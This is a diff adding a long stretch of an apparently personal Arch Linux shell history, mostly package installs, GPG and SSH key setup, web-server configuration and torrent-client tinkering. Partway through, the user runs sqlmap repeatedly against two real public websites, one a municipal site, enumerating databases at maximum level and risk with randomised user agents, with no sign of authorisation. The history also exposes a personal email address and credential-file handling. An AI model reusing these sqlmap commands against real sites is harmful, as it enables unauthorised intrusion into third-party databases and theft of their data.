@@ -911,3 +911,669 @@ sudo pacman -Rs nemo-preview
 sudo pacman -Rs nemo
 sudo pacman -Rs nemo-share
 sudo pacman -R nemo
+sudo grub-mkconfig -o /boot/grub/grub.cfg
+sudo pacman -S os-prober
+sudo grub-mkconfig -o /boot/grub/grub.cfg
+cd dotfiles/
+./update.pl 
+ssh-keygen -t rsa -b 4096 -C "emanuel.lopes.pt@gmail.com"
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa.pub 
+ssh -T git@github.com
+./update.pl 
+git config user.name
+nano ~/.netrc
+git config --global credential.helper cache
+git config --global credential.helper 'cache --timeout=3600'
+./update.pl 
+cd
+cat ~/.gitconfig 
+subl3 .netrc
+gpg --encrypt --armor --recipient emanuel.lopes.pt@gmail.com .netrc 
+gpg --gen-key
+gpg --list-secret-keys --keyid-format LONG
+gpg --armor --export F605BAAA191AFDBE
+gpg --encrypt --armor --recipient emanuel.lopes.pt@gmail.com .netrc
+gpg --list-secret-keys --keyid-format LONG
+gpg --encrypt --armor --recipient "Emanuel Lopes" .netrc
+git config --global credential.helper "netrc -f ~/.netrc.asc -v"
+cat .netrc
+cat .netrc.asc 
+mv teste.netrc.teste
+mv .netrc teste.netrc.teste
+sudo rm xorg.conf.new 
+yaourt tor
+yaourt tor-browser
+gpg
+gpg --help
+sudo pacman-key -r 2E1AC68ED40814E0
+pacman-key --help
+pacman-key -lsign-key 2E1AC68ED40814E0
+pacman-key --lsign-key 2E1AC68ED40814E0
+sudo pacman-key --lsign-key 2E1AC68ED40814E0
+sudo pacman-key -r 2E1AC68ED40814E0
+yaourt tor-browser-en
+gpg --keyserver pool.sks-keyservers.net --recv-keys 2E1AC68ED40814E0 
+yaourt tor-browser-en
+yaourt -Syu
+yaourt -Syua
+journalctl --help
+journalctl -k
+journalctl --help
+journalctl --user
+journalctl --system
+journalctl --help
+journalctl --system -since=25-07-2015
+journalctl --system --since=25-07-2015
+journalctl --system --since=25/07/2015
+journalctl --system --since=07-25-2015
+journalctl --system --since=07-25-2015 01:00:00
+journalctl --system --since="07-25-2015 01:00:00"
+journalctl --system --since="2015-07-25 01:00:00"
+journalctl --system --since "2015-07-25 01:00:00"
+journalctl --since "2015-07-25 01:00:00"
+journalctl --since "2015-07-25 14:00:00"
+journalctl --since "2015-07-25"
+sudo pacman -S sqlmap
+sqlmap --help
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data="keywords=ola"
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data="keywords=" --dbs --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
+sqlmap -u "http://supra.pt/?section=product&sub=view&product_id=1" -p "product_id" --dbs --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
+sqlmap --help
+ sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data="keywords=" --dbs --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=#1*" --dbs --random-agent
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=#1*" --dbs --random-agent --level 3 --risk 3
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info={encode|base64} 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info={encode|base64} 1 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info={encode|base64}" 1 
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=ola"
+sqlmap -u "http://www.cm-tabuaco.pt/index.php?info=YToyOntzOjQ6Im1lbnUiO3M6MzoiY2FtIjtzOjU6ImFjY2FvIjtzOjEyOiJmb19wZXNxdWlzYXIiO30="  --data "keywords=#1*" --random-agent --level 5 --risk 3 --threads 10 --dbms mysql --dbs --technique B
+sqlmap --help
+sudo pacman -S gnome-screenshoot
+sudo pacman -S gnome-screenshot
+
+startweb 
+systemctl status mysqld
+systemctl status httpd
+whereis libphp7.so
+sudo pacman -S php7
+sudo pacman -S php
+ls /etc/httpd/modules
+systemctl status httpd
+sudo pacman -R php
+yaourt php56
+history
+sudo nano /etc/pacman.d/gnupg/gpg.conf 
+yaourt php56
+history
+yaourt php56
+gpg -r C2BF0BC433CFC8B3
+gpg --keyserver pool.sks-keyservers.net --recv-keys C2BF0BC433CFC8B3
+yaourt -S php56
+istory
+history
+ls /etc/httpd/modules
+ls -l /etc/httpd/modules
+ls /usr/lib/modules
+ls /usr/lib/httpd/modules/
+subl3 /etc/httpd/conf/httpd.conf 
+ls /usr/lib/httpd/modules/
+sudo subl3 /etc/httpd/conf/httpd.conf 
+sudo /etc/httpd/conf/extra/
+ls /etc/httpd/conf/extra/
+sudo subl3 /etc/httpd/conf/httpd.conf 
+sudo systemctl restart httpd
+sudo systemctl status httpd
+sudo systemctl restart httpd
+sudo systemctl status httpd
+sudo subl3 /etc/httpd/conf/httpd.conf 
+sudo systemctl restart httpd
+sudo subl3 /etc/httpd/conf/httpd.conf 
+sudo systemctl status httpd
+sudo nano /srv/index.php
+sudo chown http /srv/index.php 
+sudo chown http:http /srv/index.php 
+cp /srv/index.php /srv/http/index.php
+sudo cp /srv/index.php /srv/http/index.php
+sudo pacman -S alsamixer
+sudo pacman -Ss alsamixer
+sudo pacman -S gnome-alsamixer
+gnome-alsamixer 
+sudo pacman -S python-simplejson
+sudo -s
+yaourt qdis
+yaourt qgis
+git clone https://github.com/3liz/lizmap-web-client.git
+sudo cp -R lizmap/ /srv/http/
+ls /srv/http/
+cd /srv/http/lizmap/
+ls
+cd lizmap/install/
+php 
+php56 
+php56 installer.php 
+sudo php56 installer.php 
+cd ..
+cd var/config/
+cp profiles.ini.php.dist profiles.ini.php
+sudo cp profiles.ini.php.dist profiles.ini.php
+sudo php56 installer.php 
+cd ..
+cd install/
+sudo php56 installer.php 
+cd
+cd /srv/http/
+cd lizmap/ 
+sudo chown :http temp/ lizmap/var/ lizmap/www/ lizmap/install/qgis/edition/ -R
+chmod 775 temp/ lizmap/var/ lizmap/www/ lizmap/install/qgis/edition/
+sudo chmod 775 temp/ lizmap/var/ lizmap/www/ lizmap/install/qgis/edition/
+ls
+lizmap/install/set_rights.sh http http
+sudo lizmap/install/set_rights.sh http http
+sudo pulseaudio --start
+sudo pacman -S pulseaudio
+sudo pacman -S pulseaudio-alsa
+sudo pacman -S alsa-utils
+alsamixer 
+alsa-info.sh 
+cd transmission-277+-cfp-git-MOD/web-client-mod/
+ls -l
+cd web/
+ls -l
+cd /usr/share/transmission/web_backup/
+cd javascript/
+ls -l
+cd ..
+ls -l
+cd images/
+ls
+cd ..
+cd javascript/
+ls
+cd ..
+cd style/
+ls
+ls transmission/
+cd..
+ls transmission/
+cd ..
+cd ../wev
+cd ../web
+sudo chmod 755 advanced/style/jqueryui/ advanced/style/transmission/ experimental/javascript/jquery/ experimental/style/jqueryui/ experimental/style/transmission/
+sudo chmod 755 advanced/javascript/jquery/
+sudo chmod 755 advanced/style/jqueryui/images/
+sudo chmod 755 advanced/style/transmission/images/
+sudo chmod 755 experimental/style/jqueryui/images/
+sudo chmod 755 experimental/style/transmission/images/
+sudo chmod 755 groups/javascript/jquery/
+tree
+sudo find /usr/share/transmission/web -type d -exec chmod 755 {} \;
+cd
+cd Downloads/
+sudo chown :transmission Transmission/
+ls -l
+yaourt transmission
+cd 
+cd transmission-2.77/
+sudo make install
+ls
+cd web/
+ls
+sudo make install
+ls
+cd ..
+sudo cp -r web/ /usr/share/transmission/web/
+yaourt transmission
+sudo pacman -Ss transmission
+svn co svn://svn.transmissionbt.com/Transmission/trunk Transmission
+sudo pacman -S svn
+svn co svn://svn.transmissionbt.com/Transmission/trunk Transmission
+wget http://download-origin.transmissionbt.com/files/transmission-2.77.tar.bz2
+tar xjf transmission-2.77.tar.bz2 
+cd transmission-2.77
+ls
+CFLAGS="-Os -march=native" ./configure && make && checkinstall
+./install-sh 
+checkinstall
+makeinstall
+make install
+sudo make install
+transmission-gtk 
+transmission-cli 
+transmission-gtk 
+sudo pacman -R transmission-gtk.spec
+sudo pacman -R transmission
+whereis transmission-gtk.spec
+whereis transmission-gtk
+sudo pacman -S transmission
+sudo pacman -S transmission-gtk.spec
+sudo pacman -Ss transmission-gtk
+sudo pacman -S transmission-gtk
+make unninstall
+make unninstall-am
+sudo make uninstall
+cd
+transmission-gtk 
+sudo pacman -S transmission-gtk
+transmission-gtk 
+sudo cp ~/.gtkrc-2.0 /root/.gtkrc-2.0
+sudo systemctl start transmission
+sudo systemctl enable transmission.service
+sudo pacman -Ss transmission
+sudo pacman -S transmission-cli
+transmission-cli 
+ls -l /usr/local/bin/
+transmission-create 
+transmission-cli
+sudo pacman -Rs transmission-2.77
+sudo pacman -Rs transmission
+rm -r transmission-2.77
+sudo pacman -Rs transmission
+sudo pacman -Qs transmission
+sudo pacman -Rs transmission-cli transmission-gtk
+sudo pacman -S transmission
+sudo pacman -S transmission-cli
+transmission-cli 
+systemctl start transmission
+transmission-cli 
+transmission-cli
+startweb 
+whereis transmission
+whereis transmission-cli
+cd /usr/share/transmission/
+ls
+ls web/
+sudo ls web/
+sudo mv -R web/ web_backup
+sudo mv web/ web_backup
+ls
+sudo cp -r /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/web/ web/
+ls
+ls web
+ls web/
+ls -l
+sudo chmod 733 web
+ls -l
+sudo chmod 755 web
+ls -l
+cd web_backup/
+ls -l
+cd ../web/
+ls -l
+sudo chmod 775 javascript/
+sudo chmod 775 style/
+sudo chmod 775 shifttq/ images groups experimental
+sudo chmod 775 advanced
+ls -l
+sudo chmod 755 advanced
+sudo chmod 755 shifttq/ images groups experimental
+ls -l
+sudo chmod 755 style/ javascript/
+cd javascript/
+ls
+s -l
+ls -l
+sudo chmod 755 jquery/
+cd ..
+ls
+ls advanced
+cd advanced
+ls -l
+sudo chmod 755 images javascript/style
+sudo chmod 755 images javascript style
+cd ..
+cd experimental
+ls
+sudo chmod 755 images javascript style
+cd ..
+ls
+cd groups
+ls
+sudo chmod 755 images javascript style
+cd ..
+ls
+cd shifttq/
+ls
+cd ..
+cd style/
+ls
+sudo chmod 755 jqueryui/ transmission/
+cd ..
+cd javascript/
+ls
+ls .l
+ls -l
+cd ..
+ls
+cd style/
+ls
+cd transmission/
+ls .l
+ls -l
+sudo chmod 755 images
+cd ..
+ls
+tree
+sudo pacman -S tree
+tree
+sudo chmod 755 transmission/images/buttons/
+sudo chmod 755 jqueryui/images/
+cd ..
+tree
+cd
+sudo -s
+cd transmission-2.77/
+ls
+CFLAGS="-Os -march=native" ./configure && make && checkinstall
+sudo make install
+transmission-cli 
+systemctl start transmission
+cd 
+ls -l
+cd transmission-277+-cfp-git-MOD/web-client-mod/
+sudo rm -r /usr/share/transmission/web_backup/
+sudo mv /usr/share/transmission/web/ /usr/share/transmission/web_backup
+ls /usr/share/transmission/
+sudo cp -r web/ /usr/share/transmission/web
+ls
+cd /usr/share/transmission/
+ls
+ls web
+history
+find /usr/share/transmission/ -type d -exec chmod 755 {} \;
+sudo find /usr/share/transmission/ -type d -exec chmod 755 {} \;
+systemctl start transmission
+sudo systemctl daemon-reload
+sudo systemctl start transmission
+sudo systemctl enable transmission
+transmission-daemon 
+ls
+sudo mv web web_novo
+s
+ls
+sudo mv web_backup/ web/
+ls
+ls web
+ls -l
+ls -l web/
+sudo rm -r web/
+ls -l
+ls
+ls -l
+ls
+tree
+sudo subl3 /etc/httpd/conf/httpd.conf 
+journalctl -f
+transmission-daemon 
+cd /usr/share/transmission/
+ls
+sudo mv web web_backup
+ls
+sudo web_novo/ web/
+sudo mv web_novo/ web/
+ls
+sudo rm -r web
+ls
+sudo cp -r /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/web/ web/
+ls
+ls web
+sudo find /usr/share/transmission/ -type d -exec chmod 755 {} \;
+ls /opt/
+sudo mv web web_novo
+ls
+whereis transmission-daemon
+ls /usr/local/share/transmission/
+sudo rm -r /usr/share/transmission/
+cd /usr/local/share/transmission/
+sudo mv web/ web_novo
+sudo cp -r /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/web/ web/
+sudo find /usr/local/share/transmission/ -type d -exec chmod 755 {} \;
+ls
+pkill firefox
+pkill transmission-daemon 
+cd
+cd transmission-2.77/
+ls
+make unninstall-am
+make uninstall-am
+sudo make uninstall-am
+sudo pacman -Qs transmission
+sudo make uninstall-am
+sudo make uninstall
+cd ../Downloads/transmission_1.91b-1_i386
+ls
+sudo cp -r ./usr/ /usr/
+sudo rm /usr/usr/
+sudo ls /usr/usr/
+sudo rm -rf /usr/usr/
+sudo cp -r ./usr/ /usr/*
+sudo cp -r ./usr/* /usr/*
+sudo cp -r ./usr/* /usr/
+sudo cp -r ./usr/local/ /usr/
+sudo cp -r ./usr/local/bin/* /usr/local/bin/
+sudo cp -r ./usr/local/share/applications/* /usr/local/share/applications/
+sudo cp -r ./usr/local/share/icons/* /usr/local/share/icons/
+sudo cp -r ./usr/local/share/locale/ /usr/local/share/locale/
+transmission
+sudo pamcan -S libcanberra
+sudo pamcan -Ss libcanberra
+sudo pamcan -Ss libcanberra-gtk
+sudo pacman -Ss libcanberra-gtk
+sudo pacman -Ss libcanberra
+transmission
+whereis libcanberra-gtk
+sudo rm /usr/local/bin/transmission
+sudo rm /usr/local/bin/transmission-daemon 
+sudo rm /usr/local/bin/transmission-remote 
+sudo rm -rf /usr/local/share/transmission/
+sudo rm -rf /usr/local/share/applications/transmission.desktop 
+transmissioncli 
+whereis transmissioncli 
+sudo rm transmissioncli 
+sudo rm /usr/local/bin/transmissioncli 
+cd transmission-2.77/
+sudo make install
+cd 
+sudo find /home/emanuelx/transmission-277+-cfp-git-MOD/web-client-mod/ -type d -exec chmod 755 {} \;
+sudo mv /usr/local/share/transmission/web/ /usr/local/share/transmission/web_old
+sudp cp -r ~/transmission-277+-cfp-git-MOD/web-client-mod/web/ /usr/local/share/transmission/web
+sudo cp -r ~/transmission-277+-cfp-git-MOD/web-client-mod/web/ /usr/local/share/transmission/web
+transmission-daemon 
+whereis settings.json
+pkill transmission-daemon 
+sudo pacman -Ss java
+yaourt java
+sudo pacman -Ss java
+sudo pacman -Ss jdk
+sudo pacman -Ss jdk8-openjdk
+java -jar 
+java -jar ~/vuse/Azureus
+java -jar ~/vuse/Azureus2.jar 
+sudo pacman -S vuse
+sudo pacman -Ss vuse
+yaourt -Ss vuse
+yaourt -S vuse
+yaourt -S vuze
+vuze 
+java -jar ~/vuse/Azureus2.jar 
+whereis vuse
+whereis vuze
+ls -l /usr/bin/vuze
+ls -l /opt/
+sudo mv /opt/vuze/Azureus2.jar /opt/vuze/Azureus2.jar.bak 
+sudo cp -r ~/vuse/* /opt/vuze/
+ls /opt/vuze/
+vuze
+sudp vuze
+sudo vuze
+sudo nano /usr/share/applications/vuze.desktop 
+sudo nano /usr/share/applications/firefox.desktop 
+sudo nano /usr/share/applications/vuze.desktop 
+vuze 
+sudo ls /opt/vuze/
+sudo ls -l /opt/vuze/
+sudo chown :vuze /opt/vuze/
+sudo chown emanuelx: /opt/vuze/
+sudo ls -l /opt/vuze/
+sudo chown -R emanuelx: /opt/vuze/
+sudo ls -l /opt/vuze/
+cd transmission-2.77/
+sudo make uninstall
+sudo systemctl disable transmission
+top
+cd
+ps -aux | grep transmisison
+ps -aux | grep trans
+kill -9 1662
+ps -aux | grep trans
+exi
+exit
+ssh emanuelx@192.168.1.50
+vuze --ui=console
+java -jar /opt/vuze/Azureus2.jar --ui=console
+quit
+exit
+ssh 192.168.1.50
+ls Vuze\ Downloads/
+ssh 192.168.1.50
+lspci -nn | grep -i audio
+lspci -nn
+vuze 
+sudo pacman -S tigervnc
+systemctl avahi
+systemctl start avahi
+systemctl start avahi-server
+pulseaudio --kill
+rm -rf ~/.pulse*
+pulseaudio --start
+alsamixer 
+sudo nano /etc/modprobe.d/alsa-base.conf 
+sudo pacman -R vuze
+yaourt vuze
+vuze-extreme-mod 
+ssh 192.168.1.50
+ls -l /opt/vuze
+vuze-extreme-mod 
+ls /opt/vuze
+ls -l /opt/vuze
+vuze-extreme-mod 
+vuze-extreme-mod 1> vuze.txt
+subl3 vuze.txt 
+sudo pacman -Ss wt
+sudo pacman -Ss swt
+sudo pacman -Ss libswt
+sudo pacman -Ss tribler
+yaourt -Ss tribler
+yaourt -S tribler
+swt
+vuze-extreme-mod 
+ls /opt/vuze
+whereis vuze.txt 
+whereis vuze
+nano /usr/bin/vuze-extreme-mod 
+sudo pacman -Ss adb
+yaourt -Ss adb
+yaourt android-sdk-platform-tools
+adb
+sudo pacman -R android-sdk-platform-tools
+sudo pacman -R android-sdk-platform-tools-dummy
+sudo pacman -S android-tools
+adb
+fastboot devices
+sudo -s
+sudo pacman -Ss mono
+sudo pacman -S mono
+ssh 192.168.1.50
+sudo pacman -S paprefs
+paprefs 
+sudo pacman -Rs paprefs
+sudo pacman -S pavucontrol
+pavucontrol 
+sudo pacman -S alsa-plugins
+ls /opt/
+pacman -Qs vuze
+sudo pacman -Rs vuze-extreme-mod
+ls /opt/
+sudo rm -rf /opt/vuze/
+ls /opt/sqlmap/
+sudo pacman -S wireshark
+sudo pacman -Ss wireshark
+sudo pacman -S wireshark-gtk
+sudo wireshark
+sudo wireshark-gtk
+sudo gpasswd -a emanuelx wireshark
+groups
+wireshark-gtk 
+sudo wireshark-gtk 
+wireshark-gtk 
+getcap /usr/bin/dumpcap 
+wireshark
+sudo -g wireshark wireshark-gtk
+groups wireshark
+groups emanuelx
+groups
+sudo nano /etc/sudoers
+wireshark-gtk 
+sudo usermod -a -G wireshark emanuelx
+groups emanuelx
+groups
+sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap
+getcap /usr/bin/dumpcap 
+wireshark-gtk 
+sudo chmod 755 /usr/bin/dumpcap 
+wireshark-gtk 
+sudo pacman -Ss arduino
+yaourt -S arduino
+sudo pacman -Syu
+telnet 192.168
+telnet 192.168.1.60
+telnet 192.168.1.64:8082
+telnet 192.168.1.64 8082
+tail -f /dev/ttyUSB0 
+pkill telnet
+sudo -s
+ps -aux wine
+ps -aux | grep wine
+ps -aux | grep RMP
+pkill RMP
+fastboot devices
+sudo -s
+wget http://6c83.vd.aclst.com/dl.php/7pFLWY03ABo/Sativa+-+Moinho.mp3?video_id=7pFLWY03ABo&t=N3BGTFdZMDNBQm8tMzE1OTQyMTE0NS0xNDcwMTQwMjExLTY2NTk3MQ%3D%3D&exp=05-08-2016&s=2d24938af4c18fbbdba8d6c31bc6c3b0
+ssh 192.168.1.50
+rm  ~/.config/spotify/window_position.prefs 
+sudo pacman -S winetriks
+sudo pacman -S winetricks
+winetricks 
+WINEARCH=win32 WINEPREFIX=~/win32 winecfg
+rm -rf ~/.wine/
+WINEARCH=win32 WINEPREFIX=~/.wine winecfg
+winetricks 
+pkill telnet
+cat /dev/ttyUSB1 
+telnet 192.168.1.64
+telnet 192.168.1.64 8082
+ssh 192.168.1.50
+cd Documents/
+ls
+git clone https://github.com/marzika/Snapprefs.git
+exit
+ssh 192.168.1.0
+ssh 192.168.1.50
+sudo pacman -Ss android
+yaourt anrdroid-studio
+yaourt android
+yaourt android-studio
+git clone https://github.com/TheZ3ro/apk2java-linux.git
+ssh 192.168.1.50
+sudo -s
+yaourt mobilemediaconverter
+yaourt converter
+yaourt winff
+winff 
+sudo pacman -Rs winff 
+sudo pacman -S handbrake
+sudo pacman -Rs handbrake
+sudo pacman -Syu
+sudo loadkeys pt-latin9
+cat /var/log/slim.log 
+startx
